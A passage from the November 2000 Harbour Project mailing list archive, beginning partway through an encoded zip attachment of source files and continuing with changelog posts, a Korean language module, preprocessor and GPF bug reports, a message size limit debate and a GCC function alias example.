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
--------------0AA573C5883198BD3BA1DE1E--


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 18:50:03 2000
Date: Thu Nov  2 18:50:03 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-02 15:45 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-02 15:45 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * source/rtl/tget.prg
   * include/hbextern.ch
     + Re-added _GET_() until support of __GET() and __GETA() added to
harbour.y


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 19:26:02 2000
Date: Thu Nov  2 19:26:02 2000
From: Charles,Kwon harbour@lists.harbour-project.org
Subject: [Harbour] MsgKo.prg update

<PRE>This is a multi-part message in MIME format.

------=_NextPart_000_002B_01C04579.A03D38A0
Content-Type: text/plain;
	charset=&quot;iso-8859-2&quot;
Content-Transfer-Encoding: base64

SSB1cGRhdGUgTXNnS28ucHJnIDotKQ0KUGxlYXNlIENWUyBJdA0KDQpCZXN0IFJlZ2FyZHMsDQpD
aGFybGVzIEt3b24gDQo=

------=_NextPart_000_002B_01C04579.A03D38A0
Content-Type: application/octet-stream;
	name=&quot;msgko.c&quot;
Content-Transfer-Encoding: quoted-printable
Content-Disposition: attachment;
	filename=&quot;msgko.c&quot;

/*
 * $Id: msgko.c,v 1.6 2000/08/15 01:31:36 vszel Exp $
 */

/*
 * Harbour Project source code:
 * Language Support Module (KR)
 *
 * Copyright 2000 Kwon, Oh-Jun  &lt;<A HREF="mailto:ohjun@fivetech.net">ohjun@fivetech.net</A>&gt;
 * www - <A HREF="http://www.harbour-project.org">http://www.harbour-project.org</A>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version, with one exception:
 *
 * The exception is that if you link the Harbour Runtime Library (HRL)
 * and/or the Harbour Virtual Machine (HVM) with other files to produce
 * an executable, this does not by itself cause the resulting executable
 * to be covered by the GNU General Public License. Your use of that
 * executable is in no way restricted on account of linking the HRL
 * and/or HVM code into it.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA (or visit
 * their web site at <A HREF="http://www.gnu.org/">http://www.gnu.org/</A>).
 *
 */

/* Language name: &lt;Your language&gt; */
/* ISO language code (2 chars): (please look it up in /doc/lang_id.txt) =
*/
/* Codepage: &lt;Your codepage&gt; */

#include &quot;hbapilng.h&quot;

static HB_LANG s_lang =3D
{
   {
      /* Identification */

      &quot;KR&quot;,                        /* ID */
      &quot;English&quot;,                   /* Name (in English) */
      &quot;=C7=D1=B1=B9=BE=EE&quot;,                    /* Name (in native =
language) */
      &quot;KR&quot;,                        /* RFC ID */
      &quot;949&quot;,                       /* Codepage */
      &quot;$Revision: 1.6 $ $Date: 2000/08/15 01:31:36 $&quot;,         /* =
Version */

      /* Month names */

      &quot;1=BF=F9&quot;,
      &quot;2=BF=F9&quot;,
      &quot;3=BF=F9&quot;,
      &quot;4=BF=F9&quot;,
      &quot;5=BF=F9&quot;,
      &quot;6=BF=F9&quot;,
      &quot;7=BF=F9&quot;,
      &quot;8=BF=F9&quot;,
      &quot;9=BF=F9&quot;,
      &quot;10=BF=F9&quot;,
      &quot;11=BF=F9&quot;,
      &quot;12=BF=F9&quot;,

      /* Day names */

      &quot;=C0=CF=BF=E4=C0=CF&quot;,
      &quot;=BF=F9=BF=E4=C0=CF&quot;,
      &quot;=C8=AD=BF=E4=C0=CF&quot;,
      &quot;=BC=F6=BF=E4=C0=CF&quot;
      &quot;=B8=F1=BF=E4=C0=CF&quot;,
      &quot;=B1=DD=BF=E4=C0=CF&quot;,
      &quot;=C5=E4=BF=E4=C0=CF&quot;,

      /* CA-Cl*pper compatible natmsg items */

      &quot;=B5=A5=C0=CC=C5=CD =C6=C4=C0=CF  s    # =B7=B9=C4=DA=B5=E5=BC=F6  =
 =C3=D6=C1=BE =BC=F6=C1=A4=C0=CF     =C5=A9=B1=E2&quot;,
      &quot;=B4=D9=B8=A5 =BF=B9=C1=A6=B8=A6 =BF=F8=C7=CF=BD=CA=B4=CF=B1=EE?&quot;,
      &quot;=C6=E4=C0=CC=C1=F6 =B9=F8=C8=A3.&quot;,
      &quot;** =BC=D2=B0=E8 **&quot;,
      &quot;* (=C1=DF=B0=A3)=BC=D2=B0=E8 *&quot;,
      &quot;*** =C3=D1=B0=E8 ***&quot;,
      &quot;=BB=F0=C0=D4&quot;,
      &quot;    &quot;,
      &quot;=C0=DF=B8=F8=B5=C8 =B3=AF=C2=A5&quot;,
      &quot;=B9=FC=C0=A7: &quot;,
      &quot; - &quot;,
      &quot;Y/N&quot;,
      &quot;=C0=DF=B8=F8=B5=C8 =C7=A5=C7=F6=BD=C4&quot;,

      /* Error description names */

      &quot;Unknown error&quot;,
      &quot;Argument error&quot;,
      &quot;Bound error&quot;,
      &quot;String overflow&quot;,
      &quot;Numeric overflow&quot;,
      &quot;Zero divisor&quot;,
      &quot;Numeric error&quot;,
      &quot;Syntax error&quot;,
      &quot;Operation too complex&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;Memory low&quot;,
      &quot;Undefined function&quot;,
      &quot;No exported method&quot;,
      &quot;Variable does not exist&quot;,
      &quot;Alias does not exist&quot;,
      &quot;No exported variable&quot;,
      &quot;Illegal characters in alias&quot;,
      &quot;Alias already in use&quot;,
      &quot;&quot;,
      &quot;Create error&quot;,
      &quot;Open error&quot;,
      &quot;Close error&quot;,
      &quot;Read error&quot;,
      &quot;Write error&quot;,
      &quot;Print error&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;Operation not supported&quot;,
      &quot;Limit exceeded&quot;,
      &quot;Corruption detected&quot;,
      &quot;Data type error&quot;,
      &quot;Data width error&quot;,
      &quot;Workarea not in use&quot;,
      &quot;Workarea not indexed&quot;,
      &quot;Exclusive required&quot;,
      &quot;Lock required&quot;,
      &quot;Write not allowed&quot;,
      &quot;Append lock failed&quot;,
      &quot;Lock Failure&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;&quot;,
      &quot;array access&quot;,
      &quot;array assign&quot;,
      &quot;array dimension&quot;,
      &quot;not an array&quot;,
      &quot;conditional&quot;,

      /* Internal error names */

      &quot;Unrecoverable error %lu: &quot;,
      &quot;Error recovery failure&quot;,
      &quot;No ERRORBLOCK() for error&quot;,
      &quot;Too many recursive error handler calls&quot;,
      &quot;RDD invalid or failed to load&quot;,
      &quot;Invalid method type from %s&quot;,
      &quot;hb_xgrab can't allocate memory&quot;,
      &quot;hb_xrealloc called with a NULL pointer&quot;,
      &quot;hb_xrealloc called with an invalid pointer&quot;,
      &quot;hb_xrealloc can't reallocate memory&quot;,
      &quot;hb_xfree called with an invalid pointer&quot;,
      &quot;hb_xfree called with a NULL pointer&quot;,
      &quot;Can\'t locate the starting procedure: \'%s\'&quot;,
      &quot;No starting procedure&quot;,
      &quot;Unsupported VM opcode&quot;,
      &quot;Symbol item expected from %s&quot;,
      &quot;Invalid symbol type for self from %s&quot;,
      &quot;Codeblock expected from %s&quot;,
      &quot;Incorrect item type on the stack trying to pop from %s&quot;,
      &quot;Stack underflow&quot;,
      &quot;An item was going to be copied to itself from %s&quot;,
      &quot;Invalid symbol item passed as memvar %s&quot;,
      &quot;Memory buffer overflow&quot;,

      /* Texts */

      &quot;YYYY/MM/DD&quot;,
      &quot;Y&quot;,
      &quot;N&quot;
   }
};

HB_LANG_ANNOUNCE( KO );

HB_CALL_ON_STARTUP_BEGIN( hb_lang_Init_KO )
   hb_langRegister( &amp;s_lang );
HB_CALL_ON_STARTUP_END( hb_lang_Init_KO )
#if ! defined(__GNUC__) &amp;&amp; ! defined(_MSC_VER)
   #pragma startup hb_lang_Init_KO
#endif
------=_NextPart_000_002B_01C04579.A03D38A0--


</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 20:03:02 2000
Date: Thu Nov  2 20:03:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] PP pulls spaces out of constant strings

<PRE>Alexander:
If a string is in square brackets, all spaces around commas are stripped out
(it thinks it's an array subscript):

? [test, comma   ,   3, 4] ==&gt; test,comma,3,4

Brian



</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 20:31:02 2000
Date: Thu Nov  2 20:31:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] PP pulls spaces out of constant strings

<PRE>Brian,

It's not just around commas, any multiple spaces like:

? [0    5    0    5]

I did report it few months back.

Ron

&gt;<i> Alexander:
</I>&gt;<i> If a string is in square brackets, all spaces around commas are 
</I>&gt;<i> stripped out
</I>&gt;<i> (it thinks it's an array subscript):
</I>&gt;<i> 
</I>&gt;<i> ? [test, comma   ,   3, 4] ==&gt; test,comma,3,4
</I>&gt;<i> 
</I>&gt;<i> Brian
</I>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 20:45:03 2000
Date: Thu Nov  2 20:45:03 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Of the last 7500 messages on <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>, 
(and I'm not counting the 500k message from last week)

1 was larger than 500k
10 were larger than 100k
12 were larger than 90k
13 were larger than 80k
14 were larger than 70k
17 were larger than 60k
19 were larger than 50k
25 were larger than 40k

I propose we put a size limit on messages at 50k. 

If I understand the process correctly, mailman will not lose the 
messages but will block the mail for administrative approval, mail 
an administrative alert and mail the sender a notice.

Comments?


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Thu Nov  2 23:44:02 2000
Date: Thu Nov  2 23:44:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-02 20:35 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-02 20:35 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * contrib/dot/pp.prg
     ! Corrected minor bug with [] string delimiters.

   * contrib/dot/rp_dot.ch
     + Added rule for EXIT


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 00:21:01 2000
Date: Fri Nov  3 00:21:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Intermittent GPF (Ryszard)

<PRE>Ryszard,

It seems we have some intermittent GPF that might be related to Garbage
Collector.

When working on pp.prg I noticed intermittent GPF that came and gone for no
apparent reason. Now, finally it seems recreateable. If I build PP using
bld_b32.bat (moved to tests)(BCC 5.5, Win98, GTWIN), and run PP.exe with no
parameters it GPFs when executing the READ (ReadModal()) inside RP_Dot().

If you comment the READ and replace it with CLEAR GETS the GPF goes away. If
you take the same code of RP_Dot() and just isolate it into a separate PRG
and just comment the ProcessFile() and ErrorBlock() lines, it works
correctly.

Here is the isolated code that does _not_ GPF:

//--------- tst.prg ----------//
PROCEDURE RP_Dot()

   LOCAL sLine := Space(256), bBlock, GetList := {}, sPPed, nNext, sBlock,
sTemp
   LOCAL sTemp2, nLen, sLeft, sSymbol

   bCount := .F.

   //ProcessFile( &quot;RP_Dot.ch&quot; )

   //ErrorBlock( {|| RP_Dot_Err() } )

   CLEAR SCREEN
   SET SCOREBOARD OFF

   @ 0,0 SAY &quot;PP: &quot;
   @ 0,4 SAY Space( 76 ) COLOR &quot;N/R&quot;

   DO WHILE .T.
      @ 24,00 SAY '.'
      @ 24,01 GET sLine PICTURE '@KS79'
      SET CURSOR ON
      READ // &lt;= GPF here in full PP.prg
   ENDDO

RETURN
//--------- EOF tst.prg ----------//

Needless to say pp.prg compiles and works perfectly with Clipper.

I didn't try to trace within ReadModal() to see where exactly it GPFs, but I
suspect that it is not related to anything at ReadModal() but rather just
get compounded at some point.

I'll appreciate it, if you can take a look at it.

TIA

Ron


</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 01:59:02 2000
Date: Fri Nov  3 01:59:02 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>Alexander or anyone:
Could you fill me in on the &quot;10-char / No-10-char&quot; compatibility mode?
Where is it documented?
I believe I am by default in 10-char limit mode.  If I were not, are 10-char
&quot;abbreviations&quot; valid at all (like the good old 4-char ones), or is there no
meaning at all to the first 10 chars?

Assuming the latter, then all standard functions must be, as you indicated,
the 10-char version to stay Clipper-compatible.
Should we be offering both the 10-char AND a fully-spelled version for those
who want to be verbose?


Brian Hays
Abacus Data Systems, Inc

----- Original Message -----
From: &quot;Alexander S.Kresin&quot; &lt;<A HREF="mailto:alex@belacy.belgorod.su">alex@belacy.belgorod.su</A>&gt;
To: &lt;<A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>&gt;
Sent: Thursday, November 02, 2000 1:50 am
Subject: [Harbour] Re: PP Problem with dbClearRel


&gt;<i> On 02.11.2000 11:12, Brian Hays &lt;<A HREF="mailto:bhays@abacuslaw.com">bhays@abacuslaw.com</A>&gt; wrote:
</I>&gt;<i>
</I>&gt;<i> BH&gt; Alexander:
</I>&gt;<i> BH&gt; I can't find any other headers affecting this.
</I>&gt;<i>
</I>&gt;<i>  Try co compile/preprocess a file with the only line - which is
</I>&gt;<i>  preprocessed wrong.
</I>&gt;<i>
</I>&gt;<i> BH&gt; But either way, I should be able to call dbClearRel(), shouldn't I?
</I>&gt;<i> BH&gt; It comes up as undefined each time, but dbClearRelation() works.
</I>&gt;<i>
</I>&gt;<i>  Yes, I'm sure we should be Clipper compatible here and this function
</I>&gt;<i>  should be called dbClearRel(), not dbClearRelation(). We need to change
</I>&gt;<i>  it's name in dbcmd.c and appropriate preprocess rule in pptable.c .
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Best regards,
</I>&gt;<i>  Alexander
</I>&gt;<i> <A HREF="http://members.xoom.com/alkresin/">http://members.xoom.com/alkresin/</A>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 02:40:04 2000
Date: Fri Nov  3 02:40:04 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>On Thu, Nov 02, 2000 at 08:44:49PM -0500, Phil Barnett wrote:
&gt;<i> 
</I>&gt;<i> Of the last 7500 messages on <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>, 
</I>&gt;<i> (and I'm not counting the 500k message from last week)
</I>&gt;<i> 
</I>&gt;<i> 1 was larger than 500k
</I>&gt;<i> 10 were larger than 100k
</I>&gt;<i> 12 were larger than 90k
</I>&gt;<i> 13 were larger than 80k
</I>&gt;<i> 14 were larger than 70k
</I>&gt;<i> 17 were larger than 60k
</I>&gt;<i> 19 were larger than 50k
</I>&gt;<i> 25 were larger than 40k
</I>&gt;<i> 
</I>&gt;<i> I propose we put a size limit on messages at 50k. 
</I>
What was the nature of the emails over the limit you propose? How many
should not have been allowed onto the list and how many should have been. I
think that's a better measure.

&gt;<i> If I understand the process correctly, mailman will not lose the messages
</I>&gt;<i> but will block the mail for administrative approval, mail an
</I>&gt;<i> administrative alert and mail the sender a notice.
</I>&gt;<i> 
</I>&gt;<i> Comments?
</I>
What then happens to said email? Does the admin get to approve it and allow
it onto the list or is it simply rejected and the sender is expected to
reduce it in size?

If we really do need a size filter I'd have thought it best to set it to
something in excess of 100k.

On the other hand, if such a filter simply causes problems for people who
quote upside down and don't know how to cleanly snip and quote in context
then I'm all for it.

Dave &quot;BOFH&quot; Pearson

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 04:12:02 2000
Date: Fri Nov  3 04:12:02 2000
From: Patrick Mast, Harbour harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>Phil,

&gt;<i> Of the last 7500 messages on <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>, 
</I>&gt;<i> (and I'm not counting the 500k message from last week)
</I>&gt;<i> 1 was larger than 500k
</I>&gt;<i> 10 were larger than 100k
</I>&gt;<i> 12 were larger than 90k
</I>&gt;<i> 13 were larger than 80k
</I>&gt;<i> 14 were larger than 70k
</I>&gt;<i> 17 were larger than 60k
</I>&gt;<i> 19 were larger than 50k
</I>&gt;<i> 25 were larger than 40k
</I>&gt;<i> I propose we put a size limit on messages at 50k.
</I>I vote for 70K.

&gt;<i> If I understand the process correctly, mailman will not lose the 
</I>&gt;<i> messages but will block the mail for administrative approval, mail 
</I>&gt;<i> an administrative alert and mail the sender a notice.
</I>So the mail goes to Tim, or to you Phil?

regards,

Patrick Mast
www.Patrick.Be.kz

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 05:29:01 2000
Date: Fri Nov  3 05:29:01 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

Thanks for the GET etc changes!

However, I've not yet been able to get them to compile. :-(  I'm not
quite sure why.  I've just seen another changelog msg, so it may be
that somehow I got a slightly out of sync version.  I'll get another
update. &lt;g&gt;

The error I got was in trying to build slex: in harbour.slx GET is
undefined.  This can easily be my fault because I'm trying to use
VC++ and to do that I made a new BAT/make file pair - which are
supposed to be like the bcc pair to make harbour using simplex but
I may have goofed. :-(

If I get them working, I'll contrib. the 2 new VC++ files.

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 05:32:02 2000
Date: Fri Nov  3 05:32:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Mailing list suggestions.

<PRE>[To Phil Barnett]

&quot;size limit ... 50k&quot;

OK.

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 05:50:03 2000
Date: Fri Nov  3 05:50:03 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>[To Brian Hays]

&quot;Should we be offering both the 10-char AND a fully-spelled version for t=
hose
who want to be verbose?&quot;

Ideally (if not too much trouble &lt;g&gt;), yes.

Maybe we could make a tenchar.lib full of tiny things to make it
work.  IIRC with Windows you can rename (export -&gt; import) such that
it takes no space in the EXE, being done by the linker.  My memory
about this is for Win16 not Win32, however, and I don't know whether
it exists for W32.  I don't know what besides Windows has a similar
facility, sorry.  OS/2 probably does.

Anyone (Dave?) know about Linux?  I've not so far hunted through it
enough. :-(

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 06:17:02 2000
Date: Fri Nov  3 06:17:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>John, Brian,

10 char (or whatever the number is) support is right there in the current source, 
you can set the symbol name length by compiling Harbour with the 
HB_SYMBOL_NAME_LEN macro set to the required value. The default is 
63 currently. Check INCLUDE/HBSETUP.H for more info.

Any new symbol length dependent code (like the RDD) should/can use this value.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 06:52:02 2000
Date: Fri Nov  3 06:52:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Intermittent GPF (Ryszard)

<PRE>[To Ron / Ryszard / others]

I also get an intermittent GPF.  I don't have any reason to think it's
related to the Garbage Collector, but it may be.

The following is the one I got yesterday, but it looks more like it
may be a solid GPF rather than the intermittent one.

It was in _memcpy when called from inside dbfcdx1.c but I don't know
enough to say much.  I think it was in hb_cdxTagExtNodeBuild, and if
I read the stack right it was line:
      memcpy( &amp;c, &amp;pData-&gt;cdxu.External.ExtData[ v + PIK-&gt;ReqByte - 2 ], =
2 );
certainly _memcpy's code uses reg EDX as the bottom 2 bits of the
move and EDX was 2.  ESI is used as the source and was an address
outside the app's address space.  That would mean the 2nd param above
was invalid. :-(

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 06:52:10 2000
Date: Fri Nov  3 06:52:10 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] bug in GET

<PRE>[To Ron]

Sorry, I got another CVS update but I still can't get the simplex
version to compile. :-(

Compiling source\compiler\hbslex.c I get from VC++:
source\compiler\harbour.slx(269) : error C2065: 'GET' : undeclared identi=
fier

Where is GET declared (or meant to be)?

John.

</PRE>

From harbour@lists.harbour-project.org  Fri Nov  3 07:03:02 2000
Date: Fri Nov  3 07:03:02 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] Re: PP Problem with dbClearRel

<PRE>On Fri, Nov 03, 2000 at 05:48:22AM -0500, John Skelton wrote:

&gt;<i> Anyone (Dave?) know about Linux? I've not so far hunted through it enough.
</I>&gt;<i> :-(
</I>
Sorry, I'm not aware of anything like that in the GNU binary tools (I'm
assuming that that's where such a facility would live). Obviously, standard
disclaimer applies, I've not looked either so I'm only reporting what I've
not noticed in the past (if that makes sense &lt;g&gt;).

Hmm...

[SFX: Decides that it's probably going to be a GCC thing, does a hunt for
the term &quot;alias&quot; (guessing here) in the GCC manual]

Assuming I've understood the problem, does this look reasonable?

,----[ Excerpt from 'Declaring Attributes of Functions' ]
|<i> `alias (&quot;target&quot;)'
</I>|<i>      The `alias' attribute causes the declaration to be emitted as an
</I>|<i>      alias for another symbol, which must be specified.  For instance,
</I>|<i> 
</I>|<i>           void __f () { /* do something */; }
</I>|<i>           void f () __attribute__ ((weak, alias (&quot;__f&quot;)));
</I>|<i> 
</I>|<i>      declares `f' to be a weak alias for `__f'.  In C++, the mangled
</I>|<i>      name for the target must be used.
</I>|<i> 
</I>|<i>      Not all target machines support this attribute.
</I>`----

That last line looks ominous. 

Ok, time for a test:

,----
|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ cat foo.c
</I>|<i> #include &lt;stdio.h&gt;
</I>|<i> 
</I>|<i> void foo( void )
</I>|<i> {
</I>|<i>     printf( &quot;Hello, World!\n&quot; );
</I>|<i> }
</I>|<i> 
</I>|<i> void ThisIsAnAliasForTheFunctionPreviouslyKnownAsFoo()
</I>|<i>     __attribute__ ((weak, alias (&quot;foo&quot;)));
</I>|<i> 
</I>|<i> int main( void )
</I>|<i> {
</I>|<i>     ThisIsAnAliasForTheFunctionPreviouslyKnownAsFoo();
</I>|<i> 
</I>|<i>     return( 0 );
</I>|<i> }
</I>|<i>
</I>|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ make foo
</I>|<i> cc     foo.c   -o foo
</I>|<i>
</I>|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ ./foo
</I>|<i> Hello, World!
</I>`----

On the surface it would appear that the alias is just that:

,----
|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ cat foo.c
</I>|<i> #include &lt;stdio.h&gt;
</I>|<i> 
</I>|<i> void foo( void )
</I>|<i> {
</I>|<i>     printf( &quot;Hello, World!\n&quot; );
</I>|<i> }
</I>|<i> 
</I>|<i> void ThisIsAnAliasForTheFunctionPreviouslyKnownAsFoo()
</I>|<i>     __attribute__ ((weak, alias (&quot;foo&quot;)));
</I>|<i> 
</I>|<i> int main( void )
</I>|<i> {
</I>|<i>     printf( &quot;%p %p\n&quot;, foo, ThisIsAnAliasForTheFunctionPreviouslyKnownAsFoo );
</I>|<i> 
</I>|<i>     return( 0 );
</I>|<i> }
</I>|<i>
</I>|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ make foo
</I>|<i> cc     foo.c   -o foo
</I>|<i>
</I>|<i> <A HREF="mailto:davep@hagbard">davep@hagbard</A>:~/temp$ ./foo
</I>|<i> 0x80483d0 0x80483d0
</I>`----

Does that help at all?

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
